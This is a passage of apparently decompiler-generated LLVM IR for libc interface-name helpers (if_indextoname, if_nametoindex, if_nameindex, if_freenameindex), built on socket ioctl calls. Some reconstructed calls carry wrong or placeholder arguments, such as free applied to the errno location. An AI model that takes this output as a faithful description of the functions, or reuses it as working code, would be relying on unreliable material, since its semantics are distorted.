  uselistorder i32* @global_var_807ca08.878, { 0, 2, 1 }
  uselistorder i32 ()* @__initbuf, { 2, 1, 0 }
}

define i32 @if_indextoname(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_8064a80 = load i32, i32* @edi, align 4
  %v0_8064a81 = load i32, i32* @esi, align 4
  %v0_8064a82 = load i32, i32* @ebx, align 4
  %v12_8064a83 = ptrtoint i32* %stack_var_-44 to i32
  %v3_8064a86 = call i32 @__opensock(i32 %v0_8064a82, i32 %v0_8064a81, i32 %v0_8064a80)
  store i32 %v3_8064a86, i32* @esi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_8064a8f = icmp slt i32 %v3_8064a86, 0
  br i1 %v2_8064a8f, label %dec_label_pc_8064af0, label %dec_label_pc_8064a93

dec_label_pc_8064a93:                             ; preds = %entry
  store i32 %arg1, i32* %eax.global-to-local, align 4
  store i32 %v12_8064a83, i32* @ebx, align 4
  store i32 %v3_8064a86, i32* %stack_var_-60, align 4
  %v3_8064aa7 = call i32 @ioctl(i32 %v3_8064a86, i32 35088, i32 %v12_8064a83)
  store i32 %v3_8064aa7, i32* %eax.global-to-local, align 4
  %v2_8064aaf = icmp slt i32 %v3_8064aa7, 0
  %v1_8064ab1 = icmp eq i1 %v2_8064aaf, false
  br i1 %v1_8064ab1, label %dec_label_pc_8064ad5, label %dec_label_pc_8064ab3

dec_label_pc_8064ab3:                             ; preds = %dec_label_pc_8064a93
  %v0_8064ab3 = load i32, i32* %stack_var_-60, align 4
  %v1_8064ab3 = call i32 @__errno_location(i32 %v0_8064ab3)
  store i32 %v1_8064ab3, i32* %eax.global-to-local, align 4
  store i32 %v1_8064ab3, i32* @edi, align 4
  %v1_8064abd = inttoptr i32 %v1_8064ab3 to i32*
  %v2_8064abd = load i32, i32* %v1_8064abd, align 4
  store i32 %v2_8064abd, i32* @ebx, align 4
  store i32 %v3_8064a86, i32* %stack_var_-60, align 4
  %v1_8064ac0 = call i32 @__libc_close(i32 %v3_8064a86)
  store i32 %v1_8064ac0, i32* %eax.global-to-local, align 4
  %v0_8064ac8 = load i32, i32* @ebx, align 4
  %v9_8064ac8 = icmp eq i32 %v0_8064ac8, 19
  %v1_8064acb = icmp eq i1 %v9_8064ac8, false
  br i1 %v1_8064acb, label %dec_label_pc_8064acf, label %dec_label_pc_8064acd

dec_label_pc_8064acd:                             ; preds = %dec_label_pc_8064ab3
  %v1_8064acd = and i32 %v0_8064ac8, -256
  %v2_8064acd = or i32 %v1_8064acd, 6
  br label %dec_label_pc_8064acf

dec_label_pc_8064acf:                             ; preds = %dec_label_pc_8064ab3, %dec_label_pc_8064acd
  %v0_8064ad1 = phi i32 [ %v0_8064ac8, %dec_label_pc_8064ab3 ], [ %v2_8064acd, %dec_label_pc_8064acd ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8064ad1 = load i32, i32* @edi, align 4
  %v2_8064ad1 = inttoptr i32 %v1_8064ad1 to i32*
  store i32 %v0_8064ad1, i32* %v2_8064ad1, align 4
  %v0_8064af6.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8064af0

dec_label_pc_8064ad5:                             ; preds = %dec_label_pc_8064a93
  store i32 %v3_8064a86, i32* %stack_var_-60, align 4
  %v1_8064ad9 = call i32 @__libc_close(i32 %v3_8064a86)
  store i32 %v1_8064ad9, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-60, align 4
  %v3_8064ae8 = inttoptr i32 %arg2 to i8*
  %v4_8064ae8 = call i32 @strncpy(i8* %v3_8064ae8, i32 %v12_8064a83, i32 16)
  store i32 %v4_8064ae8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8064af0

dec_label_pc_8064af0:                             ; preds = %entry, %dec_label_pc_8064acf, %dec_label_pc_8064ad5
  %v0_8064af6 = phi i32 [ 0, %entry ], [ %v0_8064af6.pre, %dec_label_pc_8064acf ], [ %v4_8064ae8, %dec_label_pc_8064ad5 ]
  ret i32 %v0_8064af6

; uselistorder directives
  uselistorder i32 %v0_8064ac8, { 1, 2, 0 }
  uselistorder i32 %v1_8064ab3, { 1, 0, 2 }
  uselistorder i32 %v3_8064a86, { 1, 0, 3, 2, 6, 5, 4, 7 }
  uselistorder i32 %v12_8064a83, { 1, 0, 2 }
  uselistorder i32* %stack_var_-60, { 1, 2, 3, 0, 4 }
  uselistorder i32 19, { 0, 11, 12, 13, 10, 2, 1, 9, 8, 7, 6, 5, 4, 14, 15, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8064af0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8064acf, { 1, 0 }
}

define i32 @__GI_if_nametoindex() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8064af7 = load i32, i32* @edi, align 4
  %v0_8064af8 = load i32, i32* @esi, align 4
  %v0_8064af9 = load i32, i32* @ebx, align 4
  store i32 %v0_8064af9, i32* %stack_var_-12, align 4
  %v12_8064afa = ptrtoint i32* %stack_var_-44 to i32
  %v3_8064afd = call i32 @__opensock(i32 %v0_8064af9, i32 %v0_8064af8, i32 %v0_8064af7)
  store i32 %v3_8064afd, i32* @esi, align 4
  %v2_8064b04 = icmp slt i32 %v3_8064afd, 0
  br i1 %v2_8064b04, label %dec_label_pc_8064b63, label %dec_label_pc_8064b08

dec_label_pc_8064b08:                             ; preds = %entry
  store i32 %v12_8064afa, i32* @ebx, align 4
  store i32 %v12_8064afa, i32* %stack_var_-60, align 4
  %v3_8064b14 = bitcast i32* %stack_var_-44 to i8*
  %v4_8064b14 = call i32 @strncpy(i8* %v3_8064b14, i32 %tmp3, i32 16)
  %v0_8064b22 = load i32, i32* @esi, align 4
  store i32 %v0_8064b22, i32* %stack_var_-60, align 4
  %v3_8064b23 = call i32 @ioctl(i32 %v0_8064b22, i32 35123, i32 %v12_8064afa)
  %v2_8064b2b = icmp slt i32 %v3_8064b23, 0
  %v1_8064b2d = icmp eq i1 %v2_8064b2b, false
  br i1 %v1_8064b2d, label %dec_label_pc_8064b51, label %dec_label_pc_8064b2f

dec_label_pc_8064b2f:                             ; preds = %dec_label_pc_8064b08
  %v0_8064b2f = load i32, i32* %stack_var_-60, align 4
  %v1_8064b2f = call i32 @__errno_location(i32 %v0_8064b2f)
  store i32 %v1_8064b2f, i32* @edi, align 4
  %v1_8064b39 = inttoptr i32 %v1_8064b2f to i32*
  %v2_8064b39 = load i32, i32* %v1_8064b39, align 4
  store i32 %v2_8064b39, i32* @ebx, align 4
  %v0_8064b3b = load i32, i32* @esi, align 4
  store i32 %v0_8064b3b, i32* %stack_var_-60, align 4
  %v1_8064b3c = call i32 @__libc_close(i32 %v0_8064b3b)
  %v0_8064b44 = load i32, i32* @ebx, align 4
  %v9_8064b44 = icmp eq i32 %v0_8064b44, 22
  %v1_8064b47 = icmp eq i1 %v9_8064b44, false
  br i1 %v1_8064b47, label %dec_label_pc_8064b63, label %dec_label_pc_8064b49

dec_label_pc_8064b49:                             ; preds = %dec_label_pc_8064b2f
  %v0_8064b49 = load i32, i32* @edi, align 4
  %v1_8064b49 = inttoptr i32 %v0_8064b49 to i32*
  store i32 38, i32* %v1_8064b49, align 4
  br label %dec_label_pc_8064b63

dec_label_pc_8064b51:                             ; preds = %dec_label_pc_8064b08
  %v0_8064b54 = load i32, i32* @esi, align 4
  store i32 %v0_8064b54, i32* %stack_var_-60, align 4
  %v1_8064b55 = call i32 @__libc_close(i32 %v0_8064b54)
  br label %dec_label_pc_8064b65

dec_label_pc_8064b63:                             ; preds = %dec_label_pc_8064b2f, %entry, %dec_label_pc_8064b49
  br label %dec_label_pc_8064b65

dec_label_pc_8064b65:                             ; preds = %dec_label_pc_8064b51, %dec_label_pc_8064b63
  %v0_8064b6b = phi i32 [ %tmp, %dec_label_pc_8064b51 ], [ 0, %dec_label_pc_8064b63 ]
  %v2_8064b68 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8064b68, i32* @ebx, align 4
  store i32 %v0_8064af8, i32* @esi, align 4
  store i32 %v0_8064af7, i32* @edi, align 4
  ret i32 %v0_8064b6b

; uselistorder directives
  uselistorder i32 %v1_8064b2f, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_8064b65, { 1, 0 }
  uselistorder label %dec_label_pc_8064b63, { 2, 0, 1 }
}

define i32 @__GI_if_nameindex() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8064b6f = load i32, i32* @edi, align 4
  %v0_8064b70 = load i32, i32* @esi, align 4
  %v0_8064b71 = load i32, i32* @ebx, align 4
  store i32 %v0_8064b71, i32* %stack_var_-16, align 4
  %v3_8064b75 = call i32 @__opensock(i32 %v0_8064b71, i32 %v0_8064b70, i32 %v0_8064b6f)
  store i32 %v3_8064b75, i32* %eax.global-to-local, align 4
  %v2_8064b84 = icmp slt i32 %v3_8064b75, 0
  br i1 %v2_8064b84, label %dec_label_pc_8064cfb, label %dec_label_pc_8064b8c

dec_label_pc_8064b8c:                             ; preds = %entry
  %v2_8064bb9 = ptrtoint i32* %stack_var_-24 to i32
  %v0_8064ba1.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8064b98

dec_label_pc_8064b98:                             ; preds = %dec_label_pc_8064bd7, %dec_label_pc_8064b8c
  %v0_8064ba1 = phi i32 [ %v0_8064ba1.pre, %dec_label_pc_8064b8c ], [ %v1_8064bd0, %dec_label_pc_8064bd7 ]
  %v0_8064bb2 = phi i32 [ 128, %dec_label_pc_8064b8c ], [ %v1_8064bda, %dec_label_pc_8064bd7 ]
  %stack_var_-20.0 = phi i32 [ 0, %dec_label_pc_8064b8c ], [ %v0_8064bc5, %dec_label_pc_8064bd7 ]
  %v2_8064b98 = mul i32 %v0_8064bb2, 2
  %v1_8064b9b = add i32 %v2_8064b98, 30
  %v1_8064b9e = and i32 %v1_8064b9b, -16
  %v2_8064ba1 = sub i32 %v0_8064ba1, %v1_8064b9e
  %v1_8064ba3 = add i32 %v2_8064ba1, 15
  %v1_8064ba7 = and i32 %v1_8064ba3, -16
  store i32 %v1_8064ba7, i32* %edx.global-to-local, align 4
  %v2_8064baa = add i32 %v1_8064ba7, %v2_8064b98
  store i32 %v2_8064baa, i32* %eax.global-to-local, align 4
  %v15_8064bad = icmp eq i32 %v2_8064baa, %stack_var_-20.0
  %v1_8064bb0 = icmp eq i1 %v15_8064bad, false
  br i1 %v1_8064bb0, label %dec_label_pc_8064bb8, label %dec_label_pc_8064bb2

dec_label_pc_8064bb2:                             ; preds = %dec_label_pc_8064b98
  %v2_8064bb2 = mul i32 %v0_8064bb2, 3
  br label %dec_label_pc_8064bb8

dec_label_pc_8064bb8:                             ; preds = %dec_label_pc_8064b98, %dec_label_pc_8064bb2
  %storemerge = phi i32 [ %v2_8064bb2, %dec_label_pc_8064bb2 ], [ %v2_8064b98, %dec_label_pc_8064b98 ]
  store i32 %storemerge, i32* @ebx, align 4
  %v2_8064bb8 = add i32 %v2_8064ba1, -4
  %v3_8064bb8 = inttoptr i32 %v2_8064bb8 to i32*
  store i32 %v2_8064baa, i32* %v3_8064bb8, align 4
  store i32 %v2_8064bb9, i32* %eax.global-to-local, align 4
  %v2_8064bbc = add i32 %v2_8064ba1, -8
  %v3_8064bbc = inttoptr i32 %v2_8064bbc to i32*
  store i32 %v2_8064bb9, i32* %v3_8064bbc, align 4
  %v1_8064bbd = add i32 %v2_8064ba1, -12
  %v2_8064bbd = inttoptr i32 %v1_8064bbd to i32*
  store i32 35090, i32* %v2_8064bbd, align 4
  %v5_8064bc2 = add i32 %v2_8064ba1, -16
  %v6_8064bc2 = inttoptr i32 %v5_8064bc2 to i32*
  store i32 %v3_8064b75, i32* %v6_8064bc2, align 4
  %v0_8064bc5 = load i32, i32* %edx.global-to-local, align 4
  %v0_8064bc8 = load i32, i32* @ebx, align 4
  store i32 %v0_8064bc8, i32* %stack_var_-24, align 4
  %v2_8064bcb = load i32, i32* %stack_var_-16, align 4
  %v3_8064bcb = call i32 @ioctl(i32 %v0_8064bc8, i32 %v0_8064bc5, i32 %v2_8064bcb)
  store i32 %v3_8064bcb, i32* %eax.global-to-local, align 4
  %v0_8064bd0 = load i32, i32* @esp, align 4
  %v2_8064bd3 = icmp slt i32 %v3_8064bcb, 0
  br i1 %v2_8064bd3, label %dec_label_pc_8064c1f, label %dec_label_pc_8064bd7

dec_label_pc_8064bd7:                             ; preds = %dec_label_pc_8064bb8
  %v1_8064bd0 = add i32 %v0_8064bd0, 16
  %v3_8064bd7 = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_8064bd7, i32* %eax.global-to-local, align 4
  %v1_8064bda = load i32, i32* @ebx, align 4
  %v12_8064bda = icmp eq i32 %v3_8064bd7, %v1_8064bda
  br i1 %v12_8064bda, label %dec_label_pc_8064b98, label %dec_label_pc_8064bde

dec_label_pc_8064bde:                             ; preds = %dec_label_pc_8064bd7
  %v2_8064bde = udiv i32 %v3_8064bd7, 32
  store i32 0, i32* @edi, align 4
  %v1_8064be9 = mul nuw nsw i32 %v2_8064bde, 8
  %v2_8064be9 = add nuw i32 %v1_8064be9, 8
  store i32 %v2_8064be9, i32* %eax.global-to-local, align 4
  %v3_8064bf0 = inttoptr i32 %v0_8064bd0 to i32*
  store i32 %v2_8064be9, i32* %v3_8064bf0, align 4
  %v1_8064bf1 = call i32 @malloc(i32 %v2_8064bde)
  store i32 %v1_8064bf1, i32* %eax.global-to-local, align 4
  %v0_8064bf6 = load i32, i32* @esp, align 4
  %v1_8064bfc = icmp eq i32 %v1_8064bf1, 0
  %v1_8064bfe = icmp eq i1 %v1_8064bfc, false
  br i1 %v1_8064bfe, label %dec_label_pc_8064cd1.preheader, label %dec_label_pc_8064c04

dec_label_pc_8064cd1.preheader:                   ; preds = %dec_label_pc_8064bde
  %v1_8064bf6 = add i32 %v0_8064bf6, 16
  %v1_8064c48 = inttoptr i32 %v1_8064bf1 to i8*
  %v0_8064cd130 = load i32, i32* @edi, align 4
  %v10_8064cd132 = icmp ult i32 %v0_8064cd130, %v2_8064bde
  br i1 %v10_8064cd132, label %dec_label_pc_8064c36, label %dec_label_pc_8064cda

dec_label_pc_8064c04:                             ; preds = %dec_label_pc_8064bde
  %v6_8064c07 = inttoptr i32 %v0_8064bf6 to i32*
  store i32 %v3_8064b75, i32* %v6_8064c07, align 4
  %v1_8064c0a = call i32 @__libc_close(i32 %v1_8064bf1)
  store i32 %v1_8064c0a, i32* %eax.global-to-local, align 4
  %v1_8064c0f = call i32 @__errno_location(i32 %v1_8064bf1)
  store i32 %v1_8064c0f, i32* %eax.global-to-local, align 4
  %v1_8064c14 = inttoptr i32 %v1_8064c0f to i32*
  store i32 105, i32* %v1_8064c14, align 4
  br label %dec_label_pc_8064cf8

dec_label_pc_8064c1f:                             ; preds = %dec_label_pc_8064bb8
  %v6_8064c22 = inttoptr i32 %v0_8064bd0 to i32*
  store i32 %v3_8064b75, i32* %v6_8064c22, align 4
  %v1_8064c25 = call i32 @__libc_close(i32 0)
  store i32 %v1_8064c25, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8064cf8

dec_label_pc_8064c36:                             ; preds = %dec_label_pc_8064ccb, %dec_label_pc_8064cd1.preheader
  %v0_8064c38 = phi i32 [ %v1_8064bf6, %dec_label_pc_8064cd1.preheader ], [ %v0_8064c38.pre, %dec_label_pc_8064ccb ]
  %v0_8064cd137 = phi i32 [ %v0_8064cd130, %dec_label_pc_8064cd1.preheader ], [ %v0_8064cd1, %dec_label_pc_8064ccb ]
  %v2_8064c3b = mul i32 %v0_8064cd137, 32
  store i32 %v1_8064bf1, i32* %eax.global-to-local, align 4
  %v5_8064c41 = add i32 %v2_8064c3b, %v0_8064bc5
  store i32 %v5_8064c41, i32* @ebx, align 4
  %v2_8064c44 = mul i32 %v0_8064cd137, 8
  %v3_8064c44 = add i32 %v2_8064c44, %v1_8064bf1
  store i32 %v3_8064c44, i32* @esi, align 4
  %v2_8064c47 = add i32 %v0_8064c38, -16
  %v3_8064c47 = inttoptr i32 %v2_8064c47 to i32*
  store i32 %v5_8064c41, i32* %v3_8064c47, align 4
  %v2_8064c48 = call i32 @__GI_strdup(i8* %v1_8064c48)
  store i32 %v2_8064c48, i32* %eax.global-to-local, align 4
  %v1_8064c50 = load i32, i32* @esi, align 4
  %v2_8064c50 = add i32 %v1_8064c50, 4
  %v3_8064c50 = inttoptr i32 %v2_8064c50 to i32*
  store i32 %v2_8064c48, i32* %v3_8064c50, align 4
  %v1_8064c53 = icmp eq i32 %v2_8064c48, 0
  br i1 %v1_8064c53, label %dec_label_pc_8064c6d, label %dec_label_pc_8064c57

dec_label_pc_8064c57:                             ; preds = %dec_label_pc_8064c36
  %v1_8064c57 = load i32, i32* @esp, align 4
  %v2_8064c57 = add i32 %v1_8064c57, -4
  %v3_8064c57 = inttoptr i32 %v2_8064c57 to i32*
  store i32 %v2_8064c48, i32* %v3_8064c57, align 4
  %v0_8064c58 = load i32, i32* @ebx, align 4
  %v2_8064c58 = add i32 %v1_8064c57, -8
  %v3_8064c58 = inttoptr i32 %v2_8064c58 to i32*
  store i32 %v0_8064c58, i32* %v3_8064c58, align 4
  %v1_8064c59 = add i32 %v1_8064c57, -12
  %v2_8064c59 = inttoptr i32 %v1_8064c59 to i32*
  store i32 35123, i32* %v2_8064c59, align 4
  %v5_8064c5e = add i32 %v1_8064c57, -16
  %v6_8064c5e = inttoptr i32 %v5_8064c5e to i32*
  store i32 %v3_8064b75, i32* %v6_8064c5e, align 4
  %v3_8064c61 = call i32 @ioctl(i32 %v1_8064bf1, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8064c61, i32* %eax.global-to-local, align 4
  %v2_8064c69 = icmp slt i32 %v3_8064c61, 0
  %v1_8064c6b = icmp eq i1 %v2_8064c69, false
  br i1 %v1_8064c6b, label %dec_label_pc_8064ccb, label %dec_label_pc_8064c6d

dec_label_pc_8064c6d:                             ; preds = %dec_label_pc_8064c57, %dec_label_pc_8064c36
  %v1_8064c6d = call i32 @__errno_location(i32 %v1_8064bf1)
  store i32 %v1_8064c6d, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_8064c77 = inttoptr i32 %v1_8064c6d to i32*
  %v2_8064c77 = load i32, i32* %v1_8064c77, align 4
  store i32 %v2_8064c77, i32* @esi, align 4
  %v1_8064c8e23 = load i32, i32* @edi, align 4
  %v7_8064c8e25 = icmp eq i32 %v1_8064c8e23, 0
  br i1 %v7_8064c8e25, label %dec_label_pc_8064c6d.dec_label_pc_8064c92_crit_edge, label %dec_label_pc_8064c7b.lr.ph

dec_label_pc_8064c6d.dec_label_pc_8064c92_crit_edge: ; preds = %dec_label_pc_8064c6d
  %v0_8064c92.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8064c92

dec_label_pc_8064c7b.lr.ph:                       ; preds = %dec_label_pc_8064c6d
  %v3_8064c81 = add i32 %v1_8064bf1, 4
  %v0_8064c7e.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8064c7b

dec_label_pc_8064c7b:                             ; preds = %dec_label_pc_8064c7b.lr.ph, %dec_label_pc_8064c7b
  %v0_8064c7e = phi i32 [ %v0_8064c7e.pre, %dec_label_pc_8064c7b.lr.ph ], [ %v1_8064c8b, %dec_label_pc_8064c7b ]
  %v1_8064c8129 = phi i32 [ 0, %dec_label_pc_8064c7b.lr.ph ], [ %v0_8064c8e.pre, %dec_label_pc_8064c7b ]
  store i32 %v1_8064bf1, i32* %edx.global-to-local, align 4
  %v2_8064c81 = mul i32 %v1_8064c8129, 8
  %v4_8064c81 = add i32 %v3_8064c81, %v2_8064c81
  %v5_8064c81 = inttoptr i32 %v4_8064c81 to i32*
  %v6_8064c81 = load i32, i32* %v5_8064c81, align 4
  %v8_8064c81 = add i32 %v0_8064c7e, -16
  %v9_8064c81 = inttoptr i32 %v8_8064c81 to i32*
  store i32 %v6_8064c81, i32* %v9_8064c81, align 4
  %v0_8064c85 = load i32, i32* @ebx, align 4
  %v1_8064c85 = add i32 %v0_8064c85, 1
  store i32 %v1_8064c85, i32* @ebx, align 4
  %v1_8064c86 = call i32 @free(i32 %v1_8064c6d)
  store i32 %v1_8064c86, i32* %eax.global-to-local, align 4
  %v0_8064c8b = load i32, i32* @esp, align 4
  %v1_8064c8b = add i32 %v0_8064c8b, 16
  %v0_8064c8e.pre = load i32, i32* @ebx, align 4
  %v1_8064c8e = load i32, i32* @edi, align 4
  %v7_8064c8e = icmp ult i32 %v0_8064c8e.pre, %v1_8064c8e
  br i1 %v7_8064c8e, label %dec_label_pc_8064c7b, label %dec_label_pc_8064c92

dec_label_pc_8064c92:                             ; preds = %dec_label_pc_8064c7b, %dec_label_pc_8064c6d.dec_label_pc_8064c92_crit_edge
  %v0_8064c92 = phi i32 [ %v0_8064c92.pre, %dec_label_pc_8064c6d.dec_label_pc_8064c92_crit_edge ], [ %v1_8064c8b, %dec_label_pc_8064c7b ]
  %v5_8064c95 = add i32 %v0_8064c92, -16
  %v6_8064c95 = inttoptr i32 %v5_8064c95 to i32*
  store i32 %v1_8064bf1, i32* %v6_8064c95, align 4
  %v1_8064c98 = call i32 @free(i32 %v1_8064c6d)
  store i32 %v1_8064c98, i32* %eax.global-to-local, align 4
  %v0_8064c9d = load i32, i32* @esp, align 4
  %v1_8064c9d = inttoptr i32 %v0_8064c9d to i32*
  %v2_8064c9d = load i32, i32* %v1_8064c9d, align 4
  store i32 %v2_8064c9d, i32* @ecx, align 4
  store i32 %v3_8064b75, i32* %v1_8064c9d, align 4
  %v1_8064ca1 = call i32 @__libc_close(i32 %v1_8064c6d)
  store i32 %v1_8064ca1, i32* %eax.global-to-local, align 4
  %v0_8064ca9 = load i32, i32* @esi, align 4
  %v9_8064ca9 = icmp eq i32 %v0_8064ca9, 22
  %v1_8064cac = icmp eq i1 %v9_8064ca9, false
  br i1 %v1_8064cac, label %dec_label_pc_8064cb4, label %dec_label_pc_8064cae

dec_label_pc_8064cae:                             ; preds = %dec_label_pc_8064c92
  %v1_8064cae = and i32 %v0_8064ca9, -65536
  %v2_8064cae = or i32 %v1_8064cae, 38
  br label %dec_label_pc_8064cbd

dec_label_pc_8064cb4:                             ; preds = %dec_label_pc_8064c92
  %v9_8064cb4 = icmp eq i32 %v0_8064ca9, 12
  %v1_8064cb7 = icmp eq i1 %v9_8064cb4, false
  br i1 %v1_8064cb7, label %dec_label_pc_8064cbd, label %dec_label_pc_8064cb9

dec_label_pc_8064cb9:                             ; preds = %dec_label_pc_8064cb4
  %v1_8064cb9 = and i32 %v0_8064ca9, -65536
  %v2_8064cb9 = or i32 %v1_8064cb9, 105
  br label %dec_label_pc_8064cbd

dec_label_pc_8064cbd:                             ; preds = %dec_label_pc_8064cb4, %dec_label_pc_8064cae, %dec_label_pc_8064cb9
  %v0_8064cc0 = phi i32 [ %v0_8064ca9, %dec_label_pc_8064cb4 ], [ %v2_8064cae, %dec_label_pc_8064cae ], [ %v2_8064cb9, %dec_label_pc_8064cb9 ]
  store i32 %v1_8064c6d, i32* %eax.global-to-local, align 4
  store i32 %v0_8064cc0, i32* %v1_8064c77, align 4
  br label %dec_label_pc_8064cfb

dec_label_pc_8064ccb:                             ; preds = %dec_label_pc_8064c57
  %v0_8064ccb = load i32, i32* @ebx, align 4
  %v1_8064ccb = add i32 %v0_8064ccb, 16
  %v2_8064ccb = inttoptr i32 %v1_8064ccb to i32*
  %v3_8064ccb = load i32, i32* %v2_8064ccb, align 4
  store i32 %v3_8064ccb, i32* %eax.global-to-local, align 4
  %v0_8064cce = load i32, i32* @edi, align 4
  %v1_8064cce = add i32 %v0_8064cce, 1
  store i32 %v1_8064cce, i32* @edi, align 4
  %v1_8064ccf = load i32, i32* @esi, align 4
  %v2_8064ccf = inttoptr i32 %v1_8064ccf to i32*
  store i32 %v3_8064ccb, i32* %v2_8064ccf, align 4
  %v0_8064cd1 = load i32, i32* @edi, align 4
  %v10_8064cd1 = icmp ult i32 %v0_8064cd1, %v2_8064bde
  %v0_8064c38.pre = load i32, i32* @esp, align 4
  br i1 %v10_8064cd1, label %dec_label_pc_8064c36, label %dec_label_pc_8064cda

dec_label_pc_8064cda:                             ; preds = %dec_label_pc_8064ccb, %dec_label_pc_8064cd1.preheader
  %v0_8064cd1.lcssa = phi i32 [ %v0_8064cd130, %dec_label_pc_8064cd1.preheader ], [ %v0_8064cd1, %dec_label_pc_8064ccb ]
  store i32 %v1_8064bf1, i32* %edx.global-to-local, align 4
  %v2_8064ce0 = mul i32 %v0_8064cd1.lcssa, 8
  %v3_8064ce0 = add i32 %v2_8064ce0, %v1_8064bf1
  store i32 %v3_8064ce0, i32* %eax.global-to-local, align 4
  %v1_8064ce3 = inttoptr i32 %v3_8064ce0 to i32*
  store i32 0, i32* %v1_8064ce3, align 4
  %v0_8064ce9 = load i32, i32* %eax.global-to-local, align 4
  %v1_8064ce9 = add i32 %v0_8064ce9, 4
  %v2_8064ce9 = inttoptr i32 %v1_8064ce9 to i32*
  store i32 0, i32* %v2_8064ce9, align 4
  %v4_8064cf0 = load i32, i32* @esp, align 4
  %v5_8064cf0 = add i32 %v4_8064cf0, -4
  %v6_8064cf0 = inttoptr i32 %v5_8064cf0 to i32*
  store i32 %v3_8064b75, i32* %v6_8064cf0, align 4
  %v1_8064cf3 = call i32 @__libc_close(i32 %v1_8064bf1)
  store i32 %v1_8064cf3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8064cf8

dec_label_pc_8064cf8:                             ; preds = %dec_label_pc_8064c1f, %dec_label_pc_8064c04, %dec_label_pc_8064cda
  %stack_var_-36.0 = phi i32 [ 0, %dec_label_pc_8064c1f ], [ %v1_8064bf1, %dec_label_pc_8064cda ], [ %v1_8064bf1, %dec_label_pc_8064c04 ]
  br label %dec_label_pc_8064cfb

dec_label_pc_8064cfb:                             ; preds = %entry, %dec_label_pc_8064cbd, %dec_label_pc_8064cf8
  %stack_var_-36.1 = phi i32 [ 0, %entry ], [ %stack_var_-36.0, %dec_label_pc_8064cf8 ], [ 0, %dec_label_pc_8064cbd ]
  store i32 %stack_var_-36.1, i32* %eax.global-to-local, align 4
  ret i32 %stack_var_-36.1

; uselistorder directives
  uselistorder i32 %stack_var_-36.1, { 1, 0 }
  uselistorder i32 %v0_8064cd1, { 0, 2, 1 }
  uselistorder i32 %v0_8064ca9, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v2_8064c48, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8064cd137, { 1, 0 }
  uselistorder i32 %v1_8064bf1, { 3, 6, 7, 0, 8, 10, 11, 2, 12, 9, 1, 14, 5, 4, 13, 15, 16 }
  uselistorder i32 %v2_8064bde, { 0, 3, 1, 2 }
  uselistorder i32 %v3_8064bd7, { 1, 0, 2 }
  uselistorder i32 %v0_8064bc5, { 0, 2, 1 }
  uselistorder i32 %v2_8064baa, { 1, 0, 2 }
  uselistorder i32 %v2_8064ba1, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_8064b98, { 1, 2, 0 }
  uselistorder i32 %v0_8064bb2, { 1, 0 }
  uselistorder i32 %v3_8064b75, { 1, 3, 2, 4, 0, 5, 6, 7 }
  uselistorder i32 38, { 5, 6, 4, 11, 0, 1, 7, 8, 9, 10, 2, 3 }
  uselistorder i32 35123, { 1, 0 }
  uselistorder i32 105, { 2, 3, 1, 0 }
  uselistorder i32 30, { 21, 22, 23, 16, 1, 17, 18, 19, 20, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 0 }
  uselistorder i32 (i32, i32, i32)* @__opensock, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8064cfb, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8064cf8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8064cbd, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8064c7b, { 1, 0 }
  uselistorder label %dec_label_pc_8064bb8, { 1, 0 }
}

define i32 @__GI_if_freenameindex(i32* %arg1) local_unnamed_addr {
entry:
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  %v0_8064d06 = load i32, i32* @esi, align 4
  %v0_8064d07 = load i32, i32* @ebx, align 4
  store i32 %v0_8064d07, i32* %stack_var_-8, align 4
  store i32 %tmp3, i32* @esi, align 4
  br label %dec_label_pc_8064d22

dec_label_pc_8064d13:                             ; preds = %dec_label_pc_8064d29, %dec_label_pc_8064d22
  %v1_8064d16 = add i32 %v0_8064d16, 8
  store i32 %v1_8064d16, i32* @ebx, align 4
  %v1_8064d1a = call i32 @free(i32 %v3_8064d22)
  %v0_8064d22.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8064d22

dec_label_pc_8064d22:                             ; preds = %entry, %dec_label_pc_8064d13
  %v0_8064d16 = phi i32 [ %tmp3, %entry ], [ %v0_8064d22.pre, %dec_label_pc_8064d13 ]
  %v1_8064d22 = add i32 %v0_8064d16, 4
  %v2_8064d22 = inttoptr i32 %v1_8064d22 to i32*
  %v3_8064d22 = load i32, i32* %v2_8064d22, align 4
  %v1_8064d25 = icmp eq i32 %v3_8064d22, 0
